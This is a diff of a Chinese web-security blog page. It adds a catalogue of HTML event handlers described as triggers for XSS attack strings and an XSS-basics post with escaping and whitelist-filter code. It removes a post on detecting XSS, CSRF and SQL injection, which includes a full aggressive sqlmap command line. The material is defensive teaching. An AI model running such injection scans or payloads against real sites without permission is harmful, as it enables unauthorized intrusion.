+<li><code>FSCommand()</code> （攻击者可以在嵌入式Flash对象中执行时使用此功能）</li>
+<li><code>onAbort()</code> （当用户中止加载图像时）</li>
+<li><code>onActivate()</code> （当对象设置为活动元素时）</li>
+<li><code>onAfterPrint()</code> （在用户打印或预览打印作业后激活）</li>
+<li><code>onAfterUpdate()</code> （在更新源对象中的数据后激活数据对象）</li>
+<li><code>onBeforeActivate()</code> （在将对象设置为活动元素之前触发）</li>
+<li><code>onBeforeCopy()</code>（攻击者在选择复制到剪贴板之前执行攻击字符串 - 攻击者可以使用该<code>execCommand(&quot;Copy&quot;)</code>功能执行此操作）</li>
+<li><code>onBeforeCut()</code> （攻击者在切换选择之前执行攻击字符串）</li>
+<li><code>onBeforeDeactivate()</code> （从当前对象更改activeElement后立即触发）</li>
+<li><code>onBeforeEditFocus()</code> （在可编辑元素中包含的对象进入UI激活状态或选择了可编辑容器对象的控件之前触发）</li>
+<li><code>onBeforePaste()</code>（用户需要被欺骗粘贴或使用该<code>execCommand(&quot;Paste&quot;)</code>功能强制进入它）</li>
+<li><code>onBeforePrint()</code>（用户需要被欺骗打印或攻击者可以使用<code>print()</code>或<code>execCommand(&quot;Print&quot;)</code>功能）。</li>
+<li><code>onBeforeUnload()</code> （用户需要被欺骗关闭浏览器 - 攻击者无法卸载窗口，除非它是从父级生成的）</li>
+<li><code>onBeforeUpdate()</code> （在更新源对象中的数据之前激活数据对象）</li>
+<li><code>onBegin()</code> （当元素的时间轴开始时，onbegin事件立即触发）</li>
+<li><code>onBlur()</code> （在加载另一个弹出窗口且窗口失去焦点的情况下）</li>
+<li><code>onBounce()</code> （当marquee对象的behavior属性设置为“alternate”并且选取框的内容到达窗口的一侧时触发）</li>
+<li><code>onCellChange()</code> （数据提供程序中的数据更改时触发）</li>
+<li><code>onChange()</code> （select，text或TEXTAREA字段失去焦点，其值已被修改）</li>
+<li><code>onClick()</code> （有人点击表格）</li>
+<li><code>onContextMenu()</code> （用户需要右键单击攻击区域）</li>
+<li><code>onControlSelect()</code> （当用户即将对对象进行控制选择时触发）</li>
+<li><code>onCopy()</code>（用户需要复制某些东西或者可以使用该<code>execCommand(&quot;Copy&quot;)</code>命令来利用它）</li>
+<li><code>onCut()</code>（用户需要复制某些东西或者可以使用该<code>execCommand(&quot;Cut&quot;)</code>命令来利用它）</li>
+<li><code>onDataAvailable()</code> （用户需要更改元素中的数据，否则攻击者可以执行相同的功能）</li>
+<li><code>onDataSetChanged()</code> （当数据源对象公开的数据集发生更改时触发）</li>
+<li><code>onDataSetComplete()</code> （触发表示所有数据都可从数据源对象获得）</li>
+<li><code>onDblClick()</code> （用户双击表单元素或链接）</li>
+<li><code>onDeactivate()</code> （当activeElement从当前对象更改为父文档中的另一个对象时触发）</li>
+<li><code>onDrag()</code> （要求用户拖动对象）</li>
+<li><code>onDragEnd()</code> （要求用户拖动对象）</li>
+<li><code>onDragLeave()</code> （要求用户将对象拖离有效位置）</li>
+<li><code>onDragEnter()</code> （要求用户将对象拖动到有效位置）</li>
+<li><code>onDragOver()</code> （要求用户将对象拖动到有效位置）</li>
+<li><code>onDragDrop()</code> （用户将对象（例如文件）放到浏览器窗口中）</li>
+<li><code>onDragStart()</code> （当用户开始拖动操作时发生）</li>
+<li><code>onDrop()</code> （用户将对象（例如文件）放到浏览器窗口中）</li>
+<li><code>onEnd()</code> （当时间线结束时，onEnd事件将触发。</li>
+<li><code>onError()</code> （加载文档或图像会导致错误）</li>
+<li><code>onErrorUpdate()</code> （在更新数据源对象中的关联数据时发生错误时在数据绑定对象上触发）</li>
+<li><code>onFilterChange()</code> （当可视化过滤器完成状态更改时触发）</li>
+<li><code>onFinish()</code> （当marquee完成循环时，攻击者可以创建漏洞）</li>
+<li><code>onFocus()</code> （攻击者在窗口获得焦点时执行攻击字符串）</li>
+<li><code>onFocusIn()</code> （攻击者在窗口获得焦点时执行攻击字符串）</li>
+<li><code>onFocusOut()</code> （当窗口失去焦点时，攻击者执行攻击字符串）</li>
+<li><code>onHashChange()</code> （当文档的当前地址的片段标识符部分发生更改时触发）</li>
+<li><code>onHelp()</code> （攻击者在窗口聚焦时用户点击F1时执行攻击字符串）</li>
+<li><code>onInput()</code> （通过用户界面更改元素的文本内容）</li>
+<li><code>onKeyDown()</code> （用户按下一个键）</li>
+<li><code>onKeyPress()</code> （用户按下或按住键）</li>
+<li><code>onKeyUp()</code> （用户发布密钥）</li>
+<li><code>onLayoutComplete()</code> （用户必须打印或打印预览）</li>
+<li><code>onLoad()</code> （攻击者在窗口加载后执行攻击字符串）</li>
+<li><code>onLoseCapture()</code>（可以通过该<code>releaseCapture()</code>方法利用）</li>
+<li><code>onMediaComplete()</code> （使用流媒体文件时，此事件可能会在文件开始播放之前触发）</li>
+<li><code>onMediaError()</code> （用户在浏览器中打开包含媒体文件的页面，并在出现问题时触发事件）</li>
+<li><code>onMessage()</code> （文件收到消息时开火）</li>
+<li><code>onMouseDown()</code> （攻击者需要让用户点击图像）</li>
+<li><code>onMouseEnter()</code> （光标在对象或区域上移动）</li>
+<li><code>onMouseLeave()</code> （攻击者需要让用户将鼠标悬停在图像或表格上然后再关闭）</li>
+<li><code>onMouseMove()</code> （攻击者需要让用户将鼠标悬停在图像或表格上）</li>
+<li><code>onMouseOut()</code> （攻击者需要让用户将鼠标悬停在图像或表格上然后再关闭）</li>
+<li><code>onMouseOver()</code> （光标在对象或区域上移动）</li>
+<li><code>onMouseUp()</code> （攻击者需要让用户点击图像）</li>
+<li><code>onMouseWheel()</code> （攻击者需要让用户使用他们的鼠标滚轮）</li>
+<li><code>onMove()</code> （用户或攻击者会移动页面）</li>
+<li><code>onMoveEnd()</code> （用户或攻击者会移动页面）</li>
+<li><code>onMoveStart()</code> （用户或攻击者会移动页面）</li>
+<li><code>onOffline()</code> （如果浏览器在在线模式下工作并且它开始脱机工作，则会出现）</li>
+<li><code>onOnline()</code> （如果浏览器在离线模式下工作并且它开始在线工作，则会出现）</li>
+<li><code>onOutOfSync()</code> （中断元素播放时间轴定义的媒体的能力）</li>
+<li><code>onPaste()</code>（用户需要粘贴或攻击者可以使用该<code>execCommand(&quot;Paste&quot;)</code>功能）</li>
+<li><code>onPause()</code> （onpause事件触发时间线暂停时活动的每个元素，包括body元素）</li>
+<li><code>onPopState()</code> （用户导航会话历史记录时触发）</li>
+<li><code>onProgress()</code> （攻击者会使用此作为flash电影加载）</li>
+<li><code>onPropertyChange()</code> （用户或攻击者需要更改元素属性）</li>
+<li><code>onReadyStateChange()</code> （用户或攻击者需要更改元素属性）</li>
+<li><code>onRedo()</code> （用户在撤消事务历史记录中前进）</li>
+<li><code>onRepeat()</code> （每次重复时间线时，事件都会触发一次，不包括第一个完整周期）</li>
+<li><code>onReset()</code> （用户或攻击者重置表单）</li>
+<li><code>onResize()</code>（用户将调整窗口的大小，攻击者就可以自动与像初始化：<code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>）</li>
+<li><code>onResizeEnd()</code>（用户将调整窗口的大小，攻击者就可以自动与像初始化：<code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>）</li>
+<li><code>onResizeStart()</code>（用户将调整窗口的大小，攻击者就可以自动与像初始化：<code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>）</li>
+<li><code>onResume()</code> （onresume事件触发时间线恢复时变为活动的每个元素，包括body元素）</li>
+<li><code>onReverse()</code> （如果元素的repeatCount大于1，则每次时间轴开始向后播放时都会触发此事件）</li>
+<li><code>onRowsEnter()</code> （用户或攻击者需要更改数据源中的行）</li>
+<li><code>onRowExit()</code> （用户或攻击者需要更改数据源中的行）</li>
+<li><code>onRowDelete()</code> （用户或攻击者需要删除数据源中的行）</li>
+<li><code>onRowInserted()</code> （用户或攻击者需要在数据源中插入一行）</li>
+<li><code>onScroll()</code>（用户需要滚动，否则攻击者可以使用该<code>scrollBy()</code>功能）</li>
+<li><code>onSeek()</code> （当时间轴设置为向前以外的任何方向播放时，onreverse事件将触发）</li>
+<li><code>onSelect()</code>（用户需要选择一些文本-攻击者就可以自动与像初始化：<code>window.document.execCommand(&quot;SelectAll&quot;);</code>）</li>
+<li><code>onSelectionChange()</code>（用户需要选择一些文本-攻击者就可以自动与像初始化：<code>window.document.execCommand(&quot;SelectAll&quot;);</code>）</li>
+<li><code>onSelectStart()</code>（用户需要选择一些文本-攻击者就可以自动与像初始化：<code>window.document.execCommand(&quot;SelectAll&quot;);</code>）</li>
+<li><code>onStart()</code> （在每个选框循环开始时触发）</li>
+<li><code>onStop()</code> （用户需要按停止按钮或离开网页）</li>
+<li><code>onStorage()</code> （存储区域已更改）</li>
+<li><code>onSyncRestored()</code> （用户中断元素播放其时间线所定义的媒体的能力）</li>
+<li><code>onSubmit()</code> （要求攻击者或用户提交表单）</li>
+<li><code>onTimeError()</code> （用户或攻击者将时间属性（例如dur）设置为无效值）</li>
+<li><code>onTrackChange()</code> （用户或攻击者更改播放列表中的曲目）</li>
+<li><code>onUndo()</code> （用户在撤消事务历史记录中后退）</li>
+<li><code>onUnload()</code> （当用户点击任何链接或按下后退按钮或攻击者强制点击时）</li>
+<li><code>onURLFlip()</code> （当由HTML + TIME（定时交互式多媒体扩展）媒体标记播放的高级流格式（ASF）文件处理嵌入在ASF文件中的脚本命令时，此事件将触发）</li>
+<li><code>seekSegmentTime()</code> （这是一种方法，它定位元素的段时间线上的指定点并从该点开始播放。该段包含一次重复的时间线，包括使用AUTOREVERSE属性进行反向播放。）</li>
+</ol>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2018/12/13 16:18 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15446890453437.html">
+                
+                  <h1>xss基础</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<blockquote>
+<p>description: 这里包含了xss的基本定义，原理、及防御方案代码示例。</p>
+</blockquote>
+
+<h2 id="toc_0">简介</h2>
+
+<p>跨站脚本XSS是一种注入类型攻击，攻击者注入恶意代码到web应用程序并发送给不同的最终用户时，就会发生xss攻击，并且可能发生在web应用程序<u>在其生成的输出中使用来之用户的输入</u>并且无需验证或编码它的任何地方。</p>
+
+<p>跨站脚本发生在：</p>
+
+<ul>
+<li>任何可以插入数据，并且数据包会未经恶意内容验证就发送给Web用户的地方。</li>
+</ul>
+
+<p>跨站脚本分为两类：</p>
+
+<ul>
+<li>反射型(又称非持久性xss): 反射性xss通常出现在错误消息、搜索结果、或者服务器实时响应部分或全部请求的地方。可以通过电子邮件、恶意链接、等途径进行攻击。</li>
+<li>存储型(又称持久性xss): 存储型xss通常将恶意代码永久存储在目标服务器上，如数据库、消息论坛、访问日志、注释字段等。</li>
+<li>DOM型: dom型xss我觉得也属于存储型，只不过是存储在客户端。有效载荷修改了客户端浏览器中的DOM环境并执行恶意代码，也就是说HTTP响应是不变的，恶意代码被存储在客户端响应页面中。因此很难在服务器端做安全检测。</li>
+</ul>
+
+<h2 id="toc_1">危害</h2>
+
+<p>xss可以窃取用户的会话cookie，允许攻击者劫持用户的会话并接管账号，其他攻击包括最终用户文件的泄露、木马程序安装、将用户重定向到其他页面或站点、修改内容的呈现等。</p>
+
+<p>具体危害如：允许攻击者修改新闻稿或新闻项目的XSS漏洞可能会影响公司的股价或降低消费者信心。制药网站上的XSS漏洞可能允许攻击者修改剂量信息，从而导致过量服用。</p>
+
+<h2 id="toc_2">防御</h2>
+
+<p>1、在<strong>输出时</strong>将不可信数据（用户可控的数据：包括主体、属性、JavaScript、CSS或URL）使用 htmlEscape（）进行转义；将html、js中涉及到的关键字符进行html编码处理后再输出到页面上。</p>
+
+<p>2、如果存在用户需要编写文章等功能的时候，类似用户可以自定义页面样式的功能，则需要限制用户的输入，采用严格的<strong>白名单</strong>机制来过滤用户的输入，即非用户允许的功能标签都应该被完全过滤，这种过滤应依赖于后端应用来实现。</p>
+
+<p>3、应注意很多开源的第三方富文本编辑器，部分编辑器仅在JS端进行过滤，而不在后端进行关键字过滤。</p>
+
+<h3 id="toc_3">代码示例</h3>
+
+<p>1.Java<br/>
+<strong>Portal 或 Spring 框架修复方案：</strong></p>
+
+<pre class="line-numbers"><code class="language-java">import org.springframework.web.util.HtmlUtils;
+target = HtmlUtils.htmlEscape(target);
+</code></pre>
+
+<p>// target 参数为需要进行转义的参数，建议在该参数输出前进行转义</p>
+
+<p><strong>通用型修复方案</strong>：</p>
+
+<pre class="line-numbers"><code class="language-java">StringEscapeUtils from Apache Commons Lang:
+
+import static org.apache.commons.lang.StringEscapeUtils.escapeHtml;
+// ...
+String source = &quot;The less than sign (&lt;) and ampersand (&amp;) must be escaped before using them in HTML&quot;;
+String escaped = escapeHtml(source);
+
+
+For version 3:
+
+import static org.apache.commons.lang3.StringEscapeUtils.escapeHtml4;
+// ...
+String escaped = escapeHtml4(source);
+</code></pre>
+
+<p>2.<strong>PHP</strong><br/>
+htmlspecialchars() 在输出时使用该函数转义用户输入的值，尤其注意第二个 flag 参数要使用 ENT_QUOTES</p>
+
+<pre class="line-numbers"><code class="language-php">&lt;?php 
+    $name = $_GET[&quot;name&quot;];
+    $name = htmlspecialchars($name, ENT_QUOTES);
+?&gt;
+</code></pre>
+
+<p>htmlentities() 在输出时使用该函数转义用户输入的值</p>
+
+<p>针对富文本，使用以下过滤类进行处理：</p>
+
+<pre class="line-numbers"><code class="language-php">&lt;?php
+/**
+ * PHP 富文本XSS过滤类
+ *
+ * @package XssHtml
+ * @version 1.0.0 
+ * @link http://phith0n.github.io/XssHtml
+ * @since 20140621
+ * @copyright (c) Phithon All Rights Reserved
+ *
+ */
+
+#
+# Usage: 
+# &lt;?php
+# require(&#39;Xss.php&#39;);
+# $html = &#39;&lt;html code&gt;&#39;;
+# $xss = new XssHtml($html);
+# $html = $xss-&gt;getHtml();
+# ?\&gt;
+# 
+# 需求：
+# PHP Version &gt; 5.0
+# 浏览器版本：IE7+ 或其他浏览器，无法防御IE6及以下版本浏览器中的XSS
+# 更多使用选项见 http://phith0n.github.io/XssHtml
+
+class Xss {
+    private $m_dom;
+    private $m_xss;
+    private $m_ok;
+    private $m_AllowAttr = array(&#39;title&#39;, &#39;src&#39;, &#39;href&#39;, &#39;id&#39;, &#39;class&#39;, &#39;style&#39;, &#39;width&#39;, &#39;height&#39;, &#39;alt&#39;, &#39;target&#39;, &#39;align&#39;);
+    private $m_AllowTag = array(&#39;img&#39;, &#39;br&#39;, &#39;strong&#39;, &#39;b&#39;, &#39;code&#39;, &#39;p&#39;, &#39;div&#39;, &#39;em&#39;, &#39;span&#39;, &#39;h1&#39;, &#39;h2&#39;, &#39;h3&#39;, &#39;h4&#39;, &#39;h5&#39;, &#39;h6&#39;, &#39;table&#39;, &#39;ul&#39;, &#39;ol&#39;, &#39;tr&#39;, &#39;th&#39;, &#39;td&#39;, &#39;hr&#39;, &#39;li&#39;, &#39;u&#39;);
+
+    /**
+     * 构造函数
+     *
+     * @param string $html 待过滤的文本
+     * @param string $charset 文本编码，默认utf-8
+     * @param array $AllowTag 允许的标签，如果不清楚请保持默认，默认已涵盖大部分功能，不要增加危险标签
+     */
+    public function __construct($html, $charset = &#39;utf-8&#39;, $AllowTag = array()){
+        $this-&gt;m_AllowTag = empty($AllowTag) ? $this-&gt;m_AllowTag : $AllowTag;
+        $this-&gt;m_xss = strip_tags($html, &#39;&lt;&#39; . implode(&#39;&gt;&lt;&#39;, $this-&gt;m_AllowTag) . &#39;&gt;&#39;);
+        if (empty($this-&gt;m_xss)) {
+            $this-&gt;m_ok = FALSE;
+            return ;
+        }
+        $this-&gt;m_xss = &quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html;charset={$charset}\&quot;&gt;&lt;nouse&gt;&quot; . $this-&gt;m_xss . &quot;&lt;/nouse&gt;&quot;;
+        $this-&gt;m_dom = new DOMDocument();
+        $this-&gt;m_dom-&gt;strictErrorChecking = FALSE;
+        $this-&gt;m_ok = @$this-&gt;m_dom-&gt;loadHTML($this-&gt;m_xss);
+    }
+
+    /**
+     * 获得过滤后的内容
+     */
+    public  function getHtml()
+    {
+        if (!$this-&gt;m_ok) {
+            return &#39;&#39;;
+        }
+        $nodeList = $this-&gt;m_dom-&gt;getElementsByTagName(&#39;*&#39;);
+        for ($i = 0; $i &lt; $nodeList-&gt;length; $i++){
+            $node = $nodeList-&gt;item($i);
+            if (in_array($node-&gt;nodeName, $this-&gt;m_AllowTag)) {
+                if (method_exists($this, &quot;__node_{$node-&gt;nodeName}&quot;)) {
+                    call_user_func(array($this, &quot;__node_{$node-&gt;nodeName}&quot;), $node);
+                }else{
+                    call_user_func(array($this, &#39;__node_default&#39;), $node);
+                }
+            }
+        }
+        $html = strip_tags($this-&gt;m_dom-&gt;saveHTML(), &#39;&lt;&#39; . implode(&#39;&gt;&lt;&#39;, $this-&gt;m_AllowTag) . &#39;&gt;&#39;);
+        $html = preg_replace(&#39;/^\n(.*)\n$/s&#39;, &#39;$1&#39;, $html);
+        return $html;
+    }
+
+    private function __true_url($url){
+        if (preg_match(&#39;#^https?://.+#is&#39;, $url)) {
+            return $url;
+        }else{
+            return &#39;http://&#39; . $url;
+        }
+    }
+
+    private function __get_style($node){
+        if ($node-&gt;attributes-&gt;getNamedItem(&#39;style&#39;)) {
+            $style = $node-&gt;attributes-&gt;getNamedItem(&#39;style&#39;)-&gt;nodeValue;
+            $style = str_replace(&#39;\\&#39;, &#39; &#39;, $style);
+            $style = str_replace(array(&#39;&amp;#&#39;, &#39;/*&#39;, &#39;*/&#39;), &#39; &#39;, $style);
+            $style = preg_replace(&#39;#e.*x.*p.*r.*e.*s.*s.*i.*o.*n#Uis&#39;, &#39; &#39;, $style);
+            return $style;
+        }else{
+            return &#39;&#39;;
+        }
+    }
+
+    private function __get_link($node, $att){
+        $link = $node-&gt;attributes-&gt;getNamedItem($att);
+        if ($link) {
+            return $this-&gt;__true_url($link-&gt;nodeValue);
+        }else{
+            return &#39;&#39;;
+        }
+    }
+
+    private function __setAttr($dom, $attr, $val){
+        if (!empty($val)) {
+            $dom-&gt;setAttribute($attr, $val);
+        }
+    }
+
+    private function __set_default_attr($node, $attr, $default = &#39;&#39;)
+    {
+        $o = $node-&gt;attributes-&gt;getNamedItem($attr);
+        if ($o) {
+            $this-&gt;__setAttr($node, $attr, $o-&gt;nodeValue);
+        }else{
+            $this-&gt;__setAttr($node, $attr, $default);
+        }
+    }
+
+    private function __common_attr($node)
+    {
+        $list = array();
+        foreach ($node-&gt;attributes as $attr) {
+            if (!in_array($attr-&gt;nodeName, 
+                $this-&gt;m_AllowAttr)) {
+                $list[] = $attr-&gt;nodeName;
+            }
+        }
+        foreach ($list as $attr) {
+            $node-&gt;removeAttribute($attr);
+        }
+        $style = $this-&gt;__get_style($node);
+        $this-&gt;__setAttr($node, &#39;style&#39;, $style);
+        $this-&gt;__set_default_attr($node, &#39;title&#39;);
+        $this-&gt;__set_default_attr($node, &#39;id&#39;);
+        $this-&gt;__set_default_attr($node, &#39;class&#39;);
+    }
+
+    private function __node_img($node){
+        $this-&gt;__common_attr($node);
+
+        $this-&gt;__set_default_attr($node, &#39;src&#39;);
+        $this-&gt;__set_default_attr($node, &#39;width&#39;);
+        $this-&gt;__set_default_attr($node, &#39;height&#39;);
+        $this-&gt;__set_default_attr($node, &#39;alt&#39;);
+        $this-&gt;__set_default_attr($node, &#39;align&#39;);
+
+    }
+
+    private function __node_a($node){
+        $this-&gt;__common_attr($node);
+        $href = $this-&gt;__get_link($node, &#39;href&#39;);
+
+        $this-&gt;__setAttr($node, &#39;href&#39;, $href);
+        $this-&gt;__set_default_attr($node, &#39;target&#39;, &#39;_blank&#39;);
+    }
+
+    private function __node_embed($node){
+        $this-&gt;__common_attr($node);
+        $link = $this-&gt;__get_link($node, &#39;src&#39;);
+
+        $this-&gt;__setAttr($node, &#39;src&#39;, $link);
+        $this-&gt;__setAttr($node, &#39;allowscriptaccess&#39;, &#39;never&#39;);
+        $this-&gt;__set_default_attr($node, &#39;width&#39;);
+        $this-&gt;__set_default_attr($node, &#39;height&#39;);
+    }
+
+    private function __node_default($node){
+        $this-&gt;__common_attr($node);
+    }
+}
+
+?&gt;
+</code></pre>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2018/12/13 16:17 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
                 <a class="clearlink" href="15446888524769.html">
                 
                   <h1>xss检测</h1>
@@ -725,414 +1528,6 @@ class BurpExtender(IBurpExtender, IHttpListener):
                 </div>
               </div><!-- article -->
         
-			<div class="article">
-                <a class="clearlink" href="15446869314706.html">
-                
-                  <h1>xss、csrf、sql注入快速检测方法</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<h2 id="toc_0">CSRF跨站请求伪造</h2>
-
-<ul>
-<li>原理<br/>
-攻击者在受害者不知情的情况下，以受害者的名义伪造请求发送给受攻击的站点，从而在未授权的情况下执行在权限保护之下的操作。<br/>
-CSRF攻击的对象是那些可以直接产生数据改变的服务，而对于读取数据的服务，则不需要进行 CSRF 的保护。<br/></li>
-</ul>
-
-<hr/>
-
-<ul>
-<li>检测方法<br/>
-1.查看重要操作接口提交的请求中是否包含 csrf_token<br/>
-2.更改和删除 csrf_token 后提交表单，查看请求是否能被正确响应。<br/></li>
-</ul>
-
-<hr/>
-
-<ul>
-<li>修复方案<br/>
-1.对涉及数据<strong>增、删、改</strong>操作提交的表单中添加csrf_token，token 参数应校验一次后失效。<br/>
-2.最好是在容器或框架上<strong>全局</strong>启用 csrf_token。(很多框架自带的解决办法容易遗漏一次失效的问题)<br/>
-3.token 应有一定的<strong>时效性</strong>，建议为30分钟，过期需失效（即：单页面停留30分钟后，用户提交请求需提示“页面过期，请刷新页面后再次提交”）<br/></li>
-</ul>
-
-<hr/>
-
-<ul>
-<li>参考<br/>
-<a href="https://www.owasp.org/index.php/Testing_for_CSRF_(OTG-SESS-005)">CSRF测试</a><br/>
-<a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">跨站请求伪造（CSRF）</a><br/>
-<a href="https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/">CSRF 攻击的应对之道</a><br/>
-## XSS跨站脚本攻击<br/>
-### 反射型</li>
-<li>原理<br/></li>
-</ul>
-
-<hr/>
-
-<ul>
-<li>检测方法<br/>
-<strong>检测场景</strong>：任何有输入输出地方......<br/>
-1.使用通用的web扫描器一般的都能发掘潜在的反射型XSS漏洞。<br/>
-2.手工在一些输入框中或者post参数中加入拼凑过的JS代码，根据返回的页面源码中是否成功嵌入JS代码来判断XSS是否存在。<br/>
-3.如果注入的代码经过后端处理后，永久性的嵌入到了页面当中，则该XSS为存储型的，反射型的XSS一般依赖于该次请求，且同时只能被用户自己所看到。<br/></li>
-</ul>
-
-<hr/>
-
-<ul>
-<li>修复方案<br/>
-1.输出时统一使用 htmlEscape（）转义用户输入的数据，将html、js中涉及到的关键字符进行html编码处理后再输出到页面上。<br/>
-2.如果存在用户编写文章等类似用户可以自定义页面样式的功能，则限制用户输入，采用严格的白名单来过滤用户的输入，这种过滤应在后端应实现。(很多开源的第三方富文本编辑器，部分编辑器仅在JS端进行过滤，而不在后端进行关键字过滤)。<br/></li>
-</ul>
-
-<hr/>
-
-<h3 id="toc_1">存储型</h3>
-
-<ul>
-<li>原理<br/></li>
-</ul>
-
-<hr/>
-
-<ul>
-<li>检测方法<br/>
-<strong>检测场景</strong>：存在富文本编辑器的地方；用户的输入信息会作为固定的值回显到页面中；后台管理应用中维护用户输入的相关信息。<br/>
-1.手工在一些输入框中或者post参数中加入污染的JS代码，根据返回的页面源码中是否成功嵌入JS代码来判断XSS是否存在(注入前端转义的情况)。<br/>
-2.如果注入的代码经过后端处理后，永久性的嵌入到了页面当中，则该XSS为存储型的。<br/>
-3.如果尝试注入的代码在页面中均被html编码，则再考虑其数据的流转会不会在后台其他应用中处理这些输入数据，如果有，对应的后台应用是否也做了完善的过滤机制。<br/>
-4.可远程搭建XSS检测平台，如果有XSS测试代码被触发，则自动发起链接到该平台上，这样相对来说可以测试那些未知的数据流向是否造成问题。<br/></li>
-</ul>
-
-<hr/>
-
-<ul>
-<li>修复方案<br/>
-1.输出时统一使用 htmlEscape（）转义用户输入的数据，将html、js中涉及到的关键字符进行html编码处理后再输出到页面上。<br/>
-2.如果存在用户编写文章等类似用户可以自定义页面样式的功能，则限制用户输入，采用严格的白名单来过滤用户的输入，这种过滤应在后端应实现。(很多开源的第三方富文本编辑器，部分编辑器仅在JS端进行过滤，而不在后端进行关键字过滤)。<br/></li>
-</ul>
-
-<hr/>
-
-<h3 id="toc_2">基于DOM型</h3>
-
-<ul>
-<li>原理<br/></li>
-</ul>
-
-<hr/>
-
-<p>没啥可说的，可以当成是特殊的反射型。</p>
-
-<ul>
-<li>检测方法<br/></li>
-</ul>
-
-<hr/>
-
-<ul>
-<li>修复方案<br/></li>
-</ul>
-
-<hr/>
-
-<ul>
-<li>参考<br/>
-<a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">XSS跨站脚本</a>
-## SQL_Inject<br/></li>
-<li>原理<br/></li>
-</ul>
-
-<hr/>
-
-<p>开发人员使用直接拼接 sql 的方法来访问数据库，导致攻击者能通过特殊构造的语句控制代码逻辑。典型的代码与数据没有分离导致的安全问题之一。</p>
-
-<ul>
-<li>检测方法<br/></li>
-</ul>
-
-<hr/>
-
-<ul>
-<li>常规方法<br/>
-<code>
-1 ，新建一个1 .txt文件，burp抓包将包含关键参数的请求存入。<br/>
-2 ，使用sqlmap 进行扫描（python sqlmap [options] [file path]）<br/>
-3、等待结果输出
-</code></li>
-<li>另一种常规方法<br/>
-<code>
-使用burp插件SQLiPy<br/>
-方案一（通用）：将sqlapi地址配置成 192.168.2.22 2222<br/>
-方案二：使用sqlipy生成测试语句，然后添加 -p 参数，指定注入参数，然后在 shell 里面运行 sqlmap。<br/>
-一个指定参数的SqlMap示例语句：    <br/>
-sqlmap -u “ http://xxxxxx.com:80/x/xx?x_id=1507 ” --method = “GET”-- cookie = “SESSIONID = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;<br/>
---user-agent= &quot;Mozilla / 5.0（X11; Linux_x86_64; RV：60.0）/ 20100101火狐/ 60.0&quot;  --delay=0 --timeout=30 --retries=0 --dbms=&quot;MySQL&quot;  --os=Linux   <br/>
---level=3 --risk=3 --threads=2 --time-sec=10 -b --batch --answers=&quot;crack=N,dict = N&quot;  -p &quot;zone_id&quot; --tables           
-</code>
-我们在跑注入的时候需要重点设置的参数：<br/>
--risk=3<br/>
--level=3<br/>
---threads=2<br/>
---dbms和–os去问开发或者测试<br/>
--p 指定阐述减少服务器压力</li>
-<li>不太常规的方法<br/>
-1、写一个web界面调用sqlmapapi<br/>
-2、直接找开发拉代码过来进行审计</li>
-<li>修复方案<br/></li>
-</ul>
-
-<hr/>
-
-<p>1、使用安全的API ，完全避免使用解释器，或提供参数化界面的接口，或迁移到ORM 或实体框架(通常开发框架里会自带访问sql的方法来预防注入)。<br/><br/>
-2、做参数绑定，预编译查询。PHP推荐使用PDO进行防注入<br/>
-3、若不具备开发条件，可以使用 waf 进行防御。</p>
-
-<ul>
-<li>参考<br/>
-<a href="https://www.owasp.org/index.php/SQL_Injection">SQL注入</a></li>
-</ul>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2018/12/13 15:42 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15446866501207.html">
-                
-                  <h1>IIS短文件名漏洞</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<h2 id="toc_0">漏洞原理</h2>
-
-<hr/>
-
-<p>windows在创建一个新文件时，操作系统还会生成 8.3 格式的兼容 MS-DOS 的（短）文件名，以允许基于 MS-DOS 或16位 windows 的程序访问这些文件。    </p>
-
-<h2 id="toc_1">利用场景</h2>
-
-<hr/>
-
-<p>1、用于猜解文件/文件名<br/><br/>
-2、.Net Framework 的拒绝服务攻击（不常见）</p>
-
-<h2 id="toc_2">检测方法</h2>
-
-<hr/>
-
-<p><strong>黑盒测试</strong><br/><br/>
-使用<a href="https://github.com/lijiejie/IIS_shortname_Scanner">IIS短文件名扫描器</a><br/><br/>
-<strong>白盒测试</strong><br/>
-几乎所有的 windows 操作系统，在 cmd 中使用命令：</p>
-
-<pre class="line-numbers"><code class="language-bat">dir /x
-</code></pre>
-
-<p>如图：<br/>
